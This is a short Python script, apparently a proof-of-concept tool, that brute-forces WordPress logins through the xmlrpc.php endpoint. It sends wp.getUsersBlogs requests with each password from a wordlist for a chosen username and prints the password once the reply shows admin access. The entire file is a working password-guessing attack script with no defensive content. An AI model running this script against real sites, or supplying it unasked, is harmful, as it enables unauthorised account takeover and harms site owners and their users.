# -*- coding: utf-8 -*-

"""
XMLRPC-Bruteforcer
Author: KORKUT Caner
06-07-2020
Tested on WordPress Core 5.4.1
Usage: python3 xmlrpc_poc.py http://target.com username wordlist.txt 
"""

import requests
import sys 

f = open(sys.argv[3], "r", encoding="utf8", errors='ignore')
wordlist = f.readlines()
f.close()

count = 0


for password in wordlist:
	count += 1 
	xml = """<?xml version="1.0"?>
	<methodCall>
	<methodName>wp.getUsersBlogs</methodName>
	<params>
	<param>
	<value>{}</value>
	</param>
	<param>
	<value>{}</value>
	</param>
	</params>
	</methodCall>
	""".format(sys.argv[2], password)
	headers = {'Content-Type': 'application/xml'} # set what your server accepts
	rep = requests.post('{}/xmlrpc.php'.format(sys.argv[1]), data=xml, headers=headers).text
	if count%100 == 0:
		print(count,"passwords tested")
	if "isAdmin" in rep:
		print("Mot de passe: ", password)	